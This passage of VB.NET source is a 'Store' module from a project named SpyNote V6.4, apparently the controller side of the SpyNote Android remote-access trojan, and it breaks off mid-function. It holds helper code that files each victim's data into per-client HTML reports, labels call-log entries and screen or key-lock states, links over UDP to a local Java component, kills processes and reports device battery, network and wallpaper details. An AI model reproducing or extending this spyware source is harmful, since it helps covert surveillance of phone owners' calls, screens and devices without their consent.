Imports Microsoft.VisualBasic.CompilerServices
Imports System.Collections.Generic
Imports System.Drawing.Drawing2D
Imports System.Globalization
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports SpyNote_V6._4.SN

Namespace SN.SpyNote.Stores
    Public Module Store
        Friend Class Cc
            Public Shared III As Store.Cc

            Public Shared IRIS As ParameterizedThreadStart

            Shared Sub New()
                Store.Cc.III = New Store.Cc()
            End Sub

            Friend Sub Lam_131(a0 As Object)
                Store.SvaeHTML(CType(a0, Array))
            End Sub
        End Class

        Public TScrollsInterval As Integer = 100

        Public TProgressBarInterval As Integer = 1

        Public transparency As Integer = 1

        Public Resources As String() = New String() {BrandingAssets.ProductTitle, Application.StartupPath + "\Resources"}

        Public myfolder As String() = New String() {Application.StartupPath + "\"}

        Public buff As Long = 10247L

        Private _object As Object = RuntimeHelpers.GetObjectValue(New Object())

        Private _objectg As Object = RuntimeHelpers.GetObjectValue(New Object())

        Private _objectg1 As Object = RuntimeHelpers.GetObjectValue(New Object())

        Public udpPortIsReady As Integer = 1024

        Public Java As UdpClient = New UdpClient()

        Private NetworkBW As NetworkBandwidth = New NetworkBandwidth()

        Private ListNetworkInterface As List(Of NetworkInterface) = New List(Of NetworkInterface)()

        Private ClassCPU As CPU = New CPU()

        Private kiki As Long

        Private initg As StaticLocalInitFlag

        Private qsert As Long

        Private qsf As StaticLocalInitFlag

        Private malha As Long

        Private bitik As StaticLocalInitFlag

        Private fachha As Long

        Private fitich As StaticLocalInitFlag

        Public Function BFF(vul0 As Long, vul1 As Long) As String
            Dim [object] As Object = Store._object
            ObjectFlowControl.CheckForSyncLockOnValueType([object])
            Dim result As String
            SyncLock [object]
                Dim text As String = "?"
                Try
                    Dim value As Long = vul0
                    If vul1 >= 0L AndAlso value <= Long.MaxValue - vul1 Then
                        value += vul1
                    ElseIf vul1 < 0L AndAlso value >= Long.MinValue - vul1 Then
                        value += vul1
                    End If
                    text = value.ToString(CultureInfo.InvariantCulture)
                Catch expr_33 As Exception
                End Try
                result = text
            End SyncLock
            Return result
        End Function

        Public Function BTT(vul0 As String) As String
            Dim objectg As Object = Store._objectg
            ObjectFlowControl.CheckForSyncLockOnValueType(objectg)
            Dim result As String
            SyncLock objectg
                If Operators.CompareString(vul0, "4", False) = 0 Then
                    result = "Key&ScreenOff"
                    Return result
                End If
                If Operators.CompareString(vul0, "5", False) = 0 Then
                    result = "ScreenOn"
                    Return result
                End If
                If Operators.CompareString(vul0, "6", False) = 0 Then
                    result = "ScreenOff"
                    Return result
                End If
                If Operators.CompareString(vul0, "7", False) = 0 Then
                    result = "system"
                    Return result
                End If
                If Operators.CompareString(vul0, "0", False) = 0 Then
                    result = "Outgoing"
                    Return result
                End If
                If Operators.CompareString(vul0, "1", False) = 0 Then
                    result = "Missed"
                    Return result
                End If
                If Operators.CompareString(vul0, "8", False) = 0 Then
                    result = "user"
                    Return result
                End If
                If Operators.CompareString(vul0, "2", False) = 0 Then
                    result = "Incoming"
                    Return result
                End If
                If Operators.CompareString(vul0, "3", False) = 0 Then
                    result = "Key&ScreenOn"
                    Return result
                End If
                result = "null"
            End SyncLock
            Return result
        End Function

        Public Function BTTM(vul0 As String) As String
            Dim objectg As Object = Store._objectg1
            ObjectFlowControl.CheckForSyncLockOnValueType(objectg)
            Dim result As String
            SyncLock objectg
                If Operators.CompareString(vul0, "1", False) <> 0 Then
                    If Operators.CompareString(vul0, "2", False) <> 0 Then
                        If Operators.CompareString(vul0, "3", False) <> 0 Then
                            If Operators.CompareString(vul0, "4", False) <> 0 Then
                                result = vul0
                            Else
                                result = "Destroy"
                            End If
                        Else
                            result = "Socket Timed Out"
                        End If
                    Else
                        result = "end Stream Reader"
                    End If
                Else
                    result = "no internet connection"
                End If
            End SyncLock
            Return result
        End Function

        Public Sub StartThread(Arr As Array)
            Dim arg_25_0 As ParameterizedThreadStart
            If Store.Cc.IRIS IsNot Nothing Then
                arg_25_0 = Store.Cc.IRIS
            Else
                Dim expr_1F As ParameterizedThreadStart = AddressOf Store.Cc.III.Lam_131
                arg_25_0 = expr_1F
                Store.Cc.IRIS = expr_1F
            End If
            Dim dz As New Thread(arg_25_0) With {.IsBackground = True}
            dz.Start(Arr)
        End Sub

        Public Sub SvaeHTML(d As Array)
            Try
                Dim text As String
                While True
                    text = Store.Resources(1) + "\Clients\" + Conversions.ToString(d.GetValue(3))
                    Dim flag As Boolean = Not My.Computer.FileSystem.DirectoryExists(text)
                    If Not flag Then
                        Exit While
                    End If
                    My.Computer.FileSystem.CreateDirectory(text)
                    Thread.Sleep(50)
                End While
                Dim text2 As String
                While True
                    text2 = text + "\" + Conversions.ToString(d.GetValue(4))
                    Dim flag2 As Boolean = Not My.Computer.FileSystem.DirectoryExists(text2)
                    If flag2 Then
                        My.Computer.FileSystem.CreateDirectory(text2)
                        Thread.Sleep(50)
                    Else
                        Dim flag3 As Boolean = My.Computer.FileSystem.DirectoryExists(text2)
                        If flag3 Then
                            Exit While
                        End If
                        Thread.Sleep(50)
                    End If
                End While
                Dim path As String = text2 + "\" + DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
                Dim stringBuilder As StringBuilder = CType(d.GetValue(0), StringBuilder)
                Dim stringBuilder2 As StringBuilder = CType(d.GetValue(1), StringBuilder)
                Dim stringBuilder3 As StringBuilder = CType(d.GetValue(2), StringBuilder)
                Dim stringBuilder4 As StringBuilder = New StringBuilder()
                stringBuilder4.Append("<html xmlns=""http: //www.w3.org/1999/xhtml"">" & vbCrLf)
                stringBuilder4.Append("<head>" & vbCrLf)
                stringBuilder4.Append("<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />" & vbCrLf)
                stringBuilder4.Append(stringBuilder.ToString() + vbCrLf)
                stringBuilder4.Append("<style type=""text/css"">" & vbCrLf)
                stringBuilder4.Append("       ::selection {color:#0099ff;background:#336699;}::-moz-selection {color:#0099ff;background:#336699;}" & vbCrLf & "    html { height: 100%; }  " & vbCrLf & "    td {" & vbCrLf & "        margin: 0;" & vbCrLf & "        padding: 0;" & vbCrLf & "        border: 0;" & vbCrLf & "        outline: 0;" & vbCrLf & "        font-size: 100%;" & vbCrLf & "        vertical-align: baseline;" & vbCrLf & "        background: transparent;" & vbCrLf & "    }" & vbCrLf & "    body {" & vbCrLf & "        line-height: 1;" & vbCrLf & "    }" & vbCrLf & "    ul {" & vbCrLf & "        list-style: none;" & vbCrLf & "    }" & vbCrLf & "    q {" & vbCrLf & "        quotes: none;" & vbCrLf & "    }" & vbCrLf & "    q:after {" & vbCrLf & "        content: '';" & vbCrLf & "        content: none;" & vbCrLf & "    }" & vbCrLf & "    :focus {" & vbCrLf & "        outline: 0;" & vbCrLf & "    }" & vbCrLf & "    del {" & vbCrLf & "        text-decoration: line-through;" & vbCrLf & "    }" & vbCrLf & "    table {" & vbCrLf & "        border-spacing: 0;" & vbCrLf & "    }" & vbCrLf & "    body {" & vbCrLf & "        font-family: Arial, Helvetica, sans-serif;" & vbCrLf & "        background: url(background.jpg);" & vbCrLf & "        margin: 0 auto;" & vbCrLf & "    }" & vbCrLf & "    table {" & vbCrLf & "        font-family: Arial, Helvetica, sans-serif;" & vbCrLf & "        color: #666;" & vbCrLf & "        font-size: 12px;" & vbCrLf & "        text-shadow: 1px 1px 0px #fff;" & vbCrLf & "        background: #eaebec;" & vbCrLf & "        margin: 20px;" & vbCrLf & "        border: #ccc 1px solid;" & vbCrLf & "        -moz-border-radius: 3px;" & vbCrLf & "        -webkit-border-radius: 3px;" & vbCrLf & "        border-radius: 3px;" & vbCrLf & "        -moz-box-shadow: 0 1px 2px #d1d1d1;" & vbCrLf & "        -webkit-box-shadow: 0 1px 2px #d1d1d1;" & vbCrLf & "        box-shadow: 0 1px 2px #d1d1d1;" & vbCrLf & "    }" & vbCrLf & "    table th {" & vbCrLf & "        padding: 21px 25px 22px 25px;" & vbCrLf & "        border-top: 1px solid #fafafa;" & vbCrLf & "        border-bottom: 1px solid #e0e0e0;" & vbCrLf & "        background: #ededed;" & vbCrLf & "        background: -webkit-gradient(linear, left top, left bottom, from(#ededed), to(#ebebeb));" & vbCrLf & "        background: -moz-linear-gradient(top, #ededed, #ebebeb);" & vbCrLf & "    }" & vbCrLf & "    table th:first-child {" & vbCrLf & "        text-align: left;" & vbCrLf & "        padding-left: 20px;" & vbCrLf & "    }" & vbCrLf & "    table tr:first-child th:first-child {" & vbCrLf & "        -moz-border-radius-topleft: 3px;" & vbCrLf & "        -webkit-border-top-left-radius: 3px;" & vbCrLf & "        border-top-left-radius: 3px;" & vbCrLf & "    }" & vbCrLf & "    table tr:first-child th:last-child {" & vbCrLf & "        -moz-border-radius-topright: 3px;" & vbCrLf & "        -webkit-border-top-right-radius: 3px;" & vbCrLf & "        border-top-right-radius: 3px;" & vbCrLf & "    }" & vbCrLf & "    table tr {" & vbCrLf & "        text-align: center;" & vbCrLf & "        padding-left: 20px;" & vbCrLf & "    }" & vbCrLf & "    table tr td:first-child {" & vbCrLf & "        text-align: left;" & vbCrLf & "        padding-left: 20px;" & vbCrLf & "        border-left: 0;" & vbCrLf & "    }" & vbCrLf & "    table tr td {" & vbCrLf & "        padding: 18px;" & vbCrLf & "        border-top: 1px solid #ffffff;" & vbCrLf & "        border-bottom: 1px solid #e0e0e0;" & vbCrLf & "        border-left: 1px solid #e0e0e0;" & vbCrLf & "        background: #fafafa;" & vbCrLf & "        background: -webkit-gradient(linear, left top, left bottom, from(#fbfbfb), to(#fafafa));" & vbCrLf & "        background: -moz-linear-gradient(top, #fbfbfb, #fafafa);" & vbCrLf & "    }" & vbCrLf & "    table tr.even td {" & vbCrLf & "        background: #f6f6f6;" & vbCrLf & "        background: -webkit-gradient(linear, left top, left bottom, from(#f8f8f8), to(#f6f6f6));" & vbCrLf & "        background: -moz-linear-gradient(top, #f8f8f8, #f6f6f6);" & vbCrLf & "    }" & vbCrLf & "    table tr:last-child td {" & vbCrLf & "        border-bottom: 0;" & vbCrLf & "    }" & vbCrLf & "    table tr:last-child td:first-child {" & vbCrLf & "        -moz-border-radius-bottomleft: 3px;" & vbCrLf & "        -webkit-border-bottom-left-radius: 3px;" & vbCrLf & "        border-bottom-left-radius: 3px;" & vbCrLf & "    }" & vbCrLf & "    table tr:last-child td:last-child {" & vbCrLf & "        -moz-border-radius-bottomright: 3px;" & vbCrLf & "        -webkit-border-bottom-right-radius: 3px;" & vbCrLf & "        border-bottom-right-radius: 3px;" & vbCrLf & "    }" & vbCrLf & "    table tr:hover td {" & vbCrLf & "        background: #f2f2f2;" & vbCrLf & "        background: -webkit-gradient(linear, left top, left bottom, from(#f2f2f2), to(#f0f0f0));" & vbCrLf & "        background: -moz-linear-gradient(top, #f2f2f2, #f0f0f0);" & vbCrLf & "    }" & vbCrLf & "</style>" & vbCrLf & vbCrLf & "   </head>" & vbCrLf & "   <body>" & vbCrLf & "      <center>" & vbCrLf & "         <table cellspacing='0'>" & vbCrLf)
                stringBuilder4.Append(stringBuilder2.ToString() + vbCrLf)
                stringBuilder4.Append(stringBuilder3.ToString() + vbCrLf)
                stringBuilder4.Append("</table>" & vbCrLf & "      </center>" & vbCrLf & "   </body>" & vbCrLf & "</html>")
                File.WriteAllText(path, stringBuilder4.ToString())
            Catch expr_1C7 As Exception
            End Try
        End Sub

        Public Function ScanPorts(PortNumber As Integer) As Boolean
            Dim udpClient As UdpClient = Nothing
            Dim result As Boolean
            Try
                udpClient = New UdpClient(PortNumber)
                result = True
            Catch expr_0F As SocketException
                result = False
            Finally
                Dim flag As Boolean = udpClient IsNot Nothing
                If flag Then
                    udpClient.Close()
                End If
            End Try
            Return result
        End Function

        Public Sub ConnectJava()
            Store.Java = New UdpClient()
            Store.Java.Client.SendBufferSize = 51200
            Store.Java.Client.ReceiveBufferSize = 51200
            Store.Java.Client.SendTimeout = -1
            Store.Java.Client.ReceiveTimeout = -1
            Store.Java.EnableBroadcast = True
            Store.Java.Connect("localhost", Store.udpPortIsReady)
        End Sub

        Public Function FindPID(id As Object) As Boolean
            Dim result As Boolean
            Try
                Dim processes As Process() = Process.GetProcesses()
                For i As Integer = 0 To processes.Length - 1
                    Dim process As Process = processes(i)
                    Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(process.Id, id, False)
                    If flag Then
                        process.Kill()
                        result = True
                        Return result
                    End If
                Next
                result = False
            Catch expr_49 As Exception
                result = False
            End Try
            Return result
        End Function

        Public Function Duration(Time As Integer) As String
            Dim num As Integer = Time Mod 60
            Dim num2 As Integer = CInt(Math.Round(CDec((Time - num)) / 60.0 Mod 60.0))
            Dim num3 As Integer = CInt(Math.Round(CDec((Time - (num + num2 * 60))) / 3600.0 Mod 60.0))
            Return String.Concat(New String() {Strings.Format(num3, "00"), ":", Strings.Format(num2, "00"), ":", Strings.Format(num, "00").ToString()})
        End Function

        Public Function aToTime(Value As Long) As String
            Dim result As String
            Try
                Dim num As Long = Value / 3600L
                Dim num2 As Long = (Value - num * 3600L) / 60L
                Dim valuee As Long = Value - (num * 3600L + num2 * 60L)
                result = String.Format("{0}:{1}:{2}", Conversions.ToString(num), Conversions.ToString(num2), Conversions.ToString(valuee))
            Catch expr_4C As Exception
                ProjectData.SetProjectError(expr_4C)
                result = String.Format("{0}:{1}:{2}", Conversions.ToString(0), Conversions.ToString(0), Conversions.ToString(0))
                ProjectData.ClearProjectError()
            End Try
            Return result
        End Function

        Public Function RateConverter(Value As Integer, Totalsize As Integer) As Integer
            Dim flag As Boolean = Totalsize = 0
            Dim result As Integer
            If flag Then
                result = 0
            Else
                result = CInt(Math.Round(CDec(Value) / CDec(Totalsize) * 100.0))
            End If
            Return result
        End Function

        Public Function GetTime() As String
            Dim arg As String = DateTime.Now.ToString("yyyy-MM-dd-HH.mm.ss")
            Return String.Format("{0:1}", arg, Nothing)
        End Function

        Public Function Decompress(ByRef compress As Byte()) As Byte()
            Dim result As Byte()
            Using memoryStream As MemoryStream = New MemoryStream()
                Using memoryStream2 As MemoryStream = New MemoryStream(compress)
                    Dim canSeek As Boolean = memoryStream2.CanSeek
                    If canSeek Then
                        memoryStream2.Seek(0L, SeekOrigin.Begin)
                    End If
                    Using gZipStream As GZipStream = New GZipStream(memoryStream2, CompressionMode.Decompress)
                        Store.CopyStreamToStream(gZipStream, memoryStream)
                    End Using
                    result = memoryStream.ToArray()
                End Using
            End Using
            Return result
        End Function

        Public Function Encoding() As Encoding
            Return System.Text.Encoding.UTF8
        End Function

        Public Function SplitByte(b As Byte(), s As String) As Array
            Dim list As List(Of Byte()) = New List(Of Byte())()
            Dim num As Integer = Array.IndexOf(Of Byte)(b, CByte(Strings.Asc(s(0))))
            While True
                Dim flag As Boolean = Not (num > -1 And num + s.Length <= b.Length)
                If flag Then
                    Exit While
                End If
                Dim array As Byte() = New Byte(s.Length - 1 + 1 - 1 + 1 - 1) {}
                Dim num2 As Integer = 0
                Dim num3 As Integer = num + s.Length - 1
                For i As Integer = num To num3
                    array(num2) = b(i)
                    num2 += 1
                Next
                Dim flag2 As Boolean = Operators.CompareString(Store.Encoding().GetString(array), s, False) = 0
                If flag2 Then
                    GoTo Block_3
                End If
                num = array.IndexOf(Of Byte)(b, CByte(Strings.Asc(s(0))), num + 1)
            End While
            GoTo IL_132
Block_3:
            Dim memoryStream As MemoryStream = New MemoryStream()
            memoryStream.Write(b, 0, num)
            list.Add(memoryStream.ToArray())
            memoryStream.Dispose()
            memoryStream = New MemoryStream()
            memoryStream.Write(b, num + s.Length, b.Length - (num + s.Length))
            list.Add(memoryStream.ToArray())
            memoryStream.Dispose()
IL_132:
            Dim flag3 As Boolean = list.Count = 0
            If flag3 Then
                list.Add(b)
            End If
            Return list.ToArray()
        End Function

        Public Sub CopyStreamToStream(input As Stream, output As Stream)
            Dim array As Byte() = New Byte(16383) {}
            Dim count As Integer
            While Store.InlineAssignHelper(Of Integer)(count, input.Read(array, 0, array.Length)) > 0
                output.Write(array, 0, count)
            End While
        End Sub

        Private Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
            target = value
            Return value
        End Function

        Public Function BytesConverter(bytes As Long) As Array
            Dim num As Long = 1024L
            Dim num2 As Long = num * num
            Dim num3 As Long = num * num * num
            Dim num4 As Long = num * num * num * num
            Dim text As String = "0 Bytes"
            Dim flag As Boolean = bytes < num
            If flag Then
                text = Conversions.ToString(bytes) + " Bytes"
            Else
                flag = (bytes > num4)
                If flag Then
                    text = (CDec(bytes) / CDec(num) / CDec(num) / CDec(num) / CDec(num)).ToString("0.00") + " TB"
                Else
                    flag = (bytes > num3)
                    If flag Then
                        text = (CDec(bytes) / CDec(num) / CDec(num) / CDec(num)).ToString("0.00") + " GB"
                    Else
                        flag = (bytes > num2)
                        If flag Then
                            text = (CDec(bytes) / CDec(num) / CDec(num)).ToString("0.00") + " MB"
                        Else
                            flag = (bytes >= num)
                            If flag Then
                                text = (CDec(bytes) / CDec(num)).ToString("0.00") + " KB"
                            End If
                        End If
                    End If
                End If
            End If
            Return New String() {text.ToString()}
        End Function

        Public Function UploadDownload(ParametersLong0 As Long, ParametersLong1 As Long) As Array
            Dim result As Array
            Try
                If Store.initg Is Nothing Then
                    Interlocked.CompareExchange(Of StaticLocalInitFlag)(Store.initg, New StaticLocalInitFlag(), Nothing)
                End If
                Dim flag As Boolean = False
                Try
                    Monitor.Enter(Store.initg, flag)
                    If Store.initg.State = 0S Then
                        Store.initg.State = 2S
                        Store.kiki = ParametersLong0
                    ElseIf Store.initg.State = 2S Then
                        Throw New IncompleteInitialization()
                    End If
                Finally
                    Store.initg.State = 1S
                    If flag Then
                        Monitor.[Exit](Store.initg)
                    End If
                End Try
                If Store.qsf Is Nothing Then
                    Interlocked.CompareExchange(Of StaticLocalInitFlag)(Store.qsf, New StaticLocalInitFlag(), Nothing)
                End If
                Dim flag2 As Boolean = False
                Try
                    Monitor.Enter(Store.qsf, flag2)
                    If Store.qsf.State = 0S Then
                        Store.qsf.State = 2S
                        Store.qsert = ParametersLong1
                    ElseIf Store.qsf.State = 2S Then
                        Throw New IncompleteInitialization()
                    End If
                Finally
                    Store.qsf.State = 1S
                    If flag2 Then
                        Monitor.[Exit](Store.qsf)
                    End If
                End Try
                Dim num As Long = ParametersLong0 - Store.kiki
                Dim num2 As Long = ParametersLong1 - Store.qsert
                Store.kiki = ParametersLong0
                Store.qsert = ParametersLong1
                result = New Object() {Store.BytesConverter(If((num2 < 0L), 0L, num2)).GetValue(0), Store.BytesConverter(If((num < 0L), 0L, num)).GetValue(0)}
            Catch expr_143 As Exception
                result = New String() {"n/a", "n/a"}
            End Try
            Return result
        End Function

        Public Function NetworkInterfaceUploadDownload(ParametersLong0 As Long, ParametersLong1 As Long) As Array
            Dim result As Array
            Try
                If Store.bitik Is Nothing Then
                    Interlocked.CompareExchange(Of StaticLocalInitFlag)(Store.bitik, New StaticLocalInitFlag(), Nothing)
                End If
                Dim flag As Boolean = False
                Try
                    Monitor.Enter(Store.bitik, flag)
                    If Store.bitik.State = 0S Then
                        Store.bitik.State = 2S
                        Store.malha = ParametersLong0
                    ElseIf Store.bitik.State = 2S Then
                        Throw New IncompleteInitialization()
                    End If
                Finally
                    Store.bitik.State = 1S
                    If flag Then
                        Monitor.[Exit](Store.bitik)
                    End If
                End Try
                If Store.fitich Is Nothing Then
                    Interlocked.CompareExchange(Of StaticLocalInitFlag)(Store.fitich, New StaticLocalInitFlag(), Nothing)
                End If
                Dim flag2 As Boolean = False
                Try
                    Monitor.Enter(Store.fitich, flag2)
                    If Store.fitich.State = 0S Then
                        Store.fitich.State = 2S
                        Store.fachha = ParametersLong1
                    ElseIf Store.fitich.State = 2S Then
                        Throw New IncompleteInitialization()
                    End If
                Finally
                    Store.fitich.State = 1S
                    If flag2 Then
                        Monitor.[Exit](Store.fitich)
                    End If
                End Try
                Dim num As Long = ParametersLong0 - Store.malha
                Dim num2 As Long = ParametersLong1 - Store.fachha
                Store.malha = ParametersLong0
                Store.fachha = ParametersLong1
                result = New Object() {Store.BytesConverter(If((num2 < 0L), 0L, num2)).GetValue(0), Store.BytesConverter(If((num < 0L), 0L, num)).GetValue(0)}
            Catch expr_143 As Exception
                result = New String() {"n/a", "n/a"}
            End Try
            Return result
        End Function

        Public Function CheckIPAddress(ipAddr As String) As Boolean
            Dim result As Boolean
            Try
                Dim iPAddress As IPAddress = IPAddress.Parse(ipAddr)
                result = True
            Catch expr_0D As ArgumentNullException
                result = False
            Catch expr_1E As FormatException
                result = False
            Catch expr_2F As Exception
                result = False
            End Try
            Return result
        End Function

        Public Function FindIcon(What As String, value As Object) As Array
            Dim result As Array
            If Operators.CompareString(What, "Battery", False) <> 0 Then
                If Operators.CompareString(What, "NetworkStatus", False) <> 0 Then
                    If Operators.CompareString(What, "Screen", False) <> 0 Then
                        GoTo IL_4A2
                    End If
                    GoTo IL_40A
                End If
            Else
                Try
                    Dim text As String = "b0false"
                    Dim str As String = "n/a"
                    Dim str2 As String = "n/a"
                    Dim text2 As String = CStr(value)
                    Dim flag As Boolean = text2.Trim().Length <> 0
                    If flag Then
                        text = text2.Trim()
                        Dim flag2 As Boolean = text.Contains("&")
                        If flag2 Then
                            Dim array As String() = text.ToString().Split(New String() {"&"}, StringSplitOptions.None)
                            Dim text3 As String = array(1).ToLower().Trim()
                            str2 = text3
                            str = array(0).Trim()
                            Dim num As Integer = Conversions.ToInteger(array(0).Trim())
                            Dim flag3 As Boolean = num >= 0 AndAlso num <= 10
                            If flag3 Then
                                text = "b10" + text3
                            Else
                                flag3 = (num >= 10 AndAlso num <= 20)
                                If flag3 Then
                                    text = "b20" + text3
                                Else
                                    flag3 = (num >= 20 AndAlso num <= 30)
                                    If flag3 Then
                                        text = "b30" + text3
                                    Else
                                        flag3 = (num >= 30 AndAlso num <= 40)
                                        If flag3 Then
                                            text = "b40" + text3
                                        Else
                                            flag3 = (num >= 40 AndAlso num <= 50)
                                            If flag3 Then
                                                text = "b50" + text3
                                            Else
                                                flag3 = (num >= 50 AndAlso num <= 60)
                                                If flag3 Then
                                                    text = "b60" + text3
                                                Else
                                                    flag3 = (num >= 60 AndAlso num <= 70)
                                                    If flag3 Then
                                                        text = "b70" + text3
                                                    Else
                                                        flag3 = (num >= 70 AndAlso num <= 80)
                                                        If flag3 Then
                                                            text = "b80" + text3
                                                        Else
                                                            flag3 = (num >= 80 AndAlso num <= 90)
                                                            If flag3 Then
                                                                text = "b90" + text3
                                                            Else
                                                                flag3 = (num >= 90 AndAlso num <= 100)
                                                                If Not flag3 Then
                                                                    result = New String() {"b0false", "n/a", "n/a"}
                                                                    Return result
                                                                End If
                                                                text = "b100" + text3
                                                            End If
                                                        End If
                                                    End If
                                                End If
                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If
                    result = New String() {text, "Battery" & vbCrLf & "Level: %" + str, "USB: " + str2}
                    Return result
                Catch expr_2C5 As Exception
                    result = New String() {"b0false", "n/a", "n/a"}
                    Return result
                End Try
            End If
            Dim text4 As String = "w0"
            Dim text5 As String = "n/a"
            Dim text6 As String = "n/a"
            Try
                Dim text7 As String = CStr(value)
                Dim flag4 As Boolean = text7.Trim().Length <> 0
                If flag4 Then
                    text4 = text7.Trim()
                    Dim regex As Regex = New Regex("\d+")
                    text5 = text4
                    Dim match As Match = regex.Match(text5)
                    Dim flag5 As Boolean = text4.StartsWith("w")
                    If flag5 Then
                        Dim success As Boolean = match.Success
                        If success Then
                            text5 = match.Value + " Of 4"
                            text6 = "Network Type: WiFi"
                        End If
                    Else
                        Dim success2 As Boolean = match.Success
                        If success2 Then
                            text5 = match.Value + " G"
                            text6 = "Network Type: Mobile Data"
                        End If
                    End If
                End If
                result = New String() {text4, text5, text6}
                Return result
            Catch expr_3D8 As Exception
                result = New String() {"w0", "n/a", "n/a"}
                Return result
            End Try
IL_40A:
            Dim text8 As String = "null"
            Try
                Dim text9 As String = CStr(value)
                Dim flag6 As Boolean = text9.Trim().Length <> 0
                If flag6 Then
                    text8 = text9.Trim()
                End If
                result = New String() {text8, "Phone Lock: " + text9.Trim(), "n/a"}
                Return result
            Catch expr_473 As Exception
                result = New String() {"null", "n/a", "n/a"}
                Return result
            End Try
IL_4A2:
            result = Nothing
            Return result
        End Function

        Private Function FormatImg(s As String) As Bitmap
            Dim buffer As Byte() = Convert.FromBase64String(s)
            Dim memoryStream As MemoryStream = New MemoryStream(buffer)
            Dim bitmap As Bitmap = New Bitmap(Image.FromStream(memoryStream))
            Dim pen As Pen = New Pen(Color.FromArgb(255, 45, 45, 48), 2.0F)
            Dim result As Bitmap
            Using bitmap2 As Bitmap = New Bitmap(bitmap.Width - 1, bitmap.Height - 3)
                Using graphics As Graphics = Graphics.FromImage(bitmap2)
                    graphics.SmoothingMode = SmoothingMode.AntiAlias
                    Using textureBrush As TextureBrush = New TextureBrush(bitmap)
                        textureBrush.TranslateTransform(0F, 0F)
                        Using graphicsPath As GraphicsPath = New GraphicsPath()
                            graphicsPath.AddEllipse(4, 4, bitmap.Width - 12, bitmap.Height - 12)
                            graphics.FillPath(textureBrush, graphicsPath)
                            graphics.DrawEllipse(pen, 4, 4, bitmap.Width - 12, bitmap.Height - 12)
                        End Using
                    End Using
                End Using
                memoryStream.Dispose()
                result = New Bitmap(bitmap2)
            End Using
            Return result
        End Function

        Public Function Wallpaper(v As String, xx As Integer, yy As Integer) As Bitmap
            Dim s As String = My.Resources.Resources.aBitmap.ToString()
            Dim flag As Boolean = Operators.CompareString(v, "-1", False) <> 0 Or Operators.CompareString(v, "", False) = 0
            If flag Then
                Dim buffer As Byte() = Convert.FromBase64String(v)
                Dim memoryStream As MemoryStream = New MemoryStream(buffer)
                Dim bitmap As Bitmap = New Bitmap(Image.FromStream(memoryStream))
                Dim width As Integer = bitmap.Size.Width
                Dim height As Integer = bitmap.Size.Height
                Dim flag2 As Boolean = width = xx And height = yy
                If flag2 Then
                    s = v
                End If
                memoryStream.Dispose()
            End If
            Return Store.FormatImg(s)
        End Function

        Private Function mFormatImg(s As String) As Bitmap
            Dim buffer As Byte() = Convert.FromBase64String(s)
            Dim memoryStream As MemoryStream = New MemoryStream(buffer)
            Dim bitmap As Bitmap = New Bitmap(Image.FromStream(memoryStream))
            Dim result As Bitmap
            Using bitmap2 As Bitmap = New Bitmap(bitmap.Width - 3, bitmap.Height - 3)
                Using graphics As Graphics = Graphics.FromImage(bitmap2)
                    graphics.SmoothingMode = SmoothingMode.AntiAlias
                    Using textureBrush As TextureBrush = New TextureBrush(bitmap)
                        textureBrush.TranslateTransform(0F, 0F)
                        Using graphicsPath As GraphicsPath = New GraphicsPath()
                            graphicsPath.AddEllipse(0, 0, bitmap.Width - 5, bitmap.Height - 5)
                            graphics.FillPath(textureBrush, graphicsPath)
                        End Using
                    End Using
                End Using
                memoryStream.Dispose()
                result = New Bitmap(bitmap2)
            End Using
            Return result
        End Function

        Public Function mWallpaper(v As String, xx As Integer, yy As Integer) As Bitmap
            Dim s As String = My.Resources.Resources.aBitmap.ToString()
            Dim flag As Boolean = Operators.CompareString(v, "-1", False) <> 0 Or Operators.CompareString(v, "", False) = 0
            If flag Then
                Dim buffer As Byte() = Convert.FromBase64String(v)
                Dim memoryStream As MemoryStream = New MemoryStream(buffer)
                Dim bitmap As Bitmap = New Bitmap(Image.FromStream(memoryStream))
                Dim width As Integer = bitmap.Size.Width
                Dim height As Integer = bitmap.Size.Height
                Dim flag2 As Boolean = width = xx And height = yy
                If flag2 Then
                    s = v
                End If
                memoryStream.Dispose()
            End If
            Return Store.mFormatImg(s)
        End Function

        Public Function GetHostName() As String
            Dim result As String
            Try
                Dim hostName As String = Dns.GetHostName()
                result = hostName.ToString()
            Catch expr_11 As Exception
                result = "n/a"
            End Try
            Return result
        End Function

        Public Function GetIPAddress() As String
            Dim result As String
            Try
                Dim hostName As String = Dns.GetHostName()
#Disable Warning BC40000 ' Type or member is obsolete
                Dim text As String = Dns.GetHostByName(hostName).AddressList(0).ToString()
#Enable Warning BC40000 ' Type or member is obsolete
                result = text.ToString()
            Catch expr_24 As Exception
                result = "n/a"
            End Try
            Return result
        End Function

        Public Sub LoadNic()
            Try
                Dim enumerator As List(Of NetworkInterface).Enumerator = Store.NetworkBW.GetNetInteface().GetEnumerator()
                While enumerator.MoveNext()
                    Dim current As NetworkInterface = enumerator.Current
                    Store.ListNetworkInterface.Add(current)
                End While
            Finally
            End Try
        End Sub

        Public Function Bandwidth() As Array
            Dim result As Array
            Try
                Dim primaryNic As Integer = Store.GetPrimaryNic()
                Dim flag As Boolean = primaryNic >= 0
                If flag Then
                    Dim iPv4Statistics As IPv4InterfaceStatistics = Store.ListNetworkInterface(primaryNic).GetIPv4Statistics()
                    Dim iPProperties As IPInterfaceProperties = Store.ListNetworkInterface(primaryNic).GetIPProperties()
                    Dim array As Array = Store.NetworkInterfaceUploadDownload(iPv4Statistics.BytesSent, iPv4Statistics.BytesReceived)
                    Dim num As Integer = CInt(Math.Round(CDec(Store.ListNetworkInterface(primaryNic).Speed) / 1000000.0))
                    result = New Object() {array.GetValue(0), array.GetValue(1), Store.ListNetworkInterface(primaryNic).NetworkInterfaceType.ToString(), Store.ListNetworkInterface(primaryNic).GetPhysicalAddress().ToString(), Store.ListNetworkInterface(primaryNic).IsReceiveOnly.ToString(), Store.ListNetworkInterface(primaryNic).SupportsMulticast.ToString(), num.ToString("#,000") + " Mbps", Store.ListNetworkInterface(primaryNic).Name.ToString()}
                Else
                    result = New String() {"n/a", "n/a", "n/a", "n/a", "n/a", "n/a", "n/a", "n/a"}
                End If
            Catch expr_17E As Exception
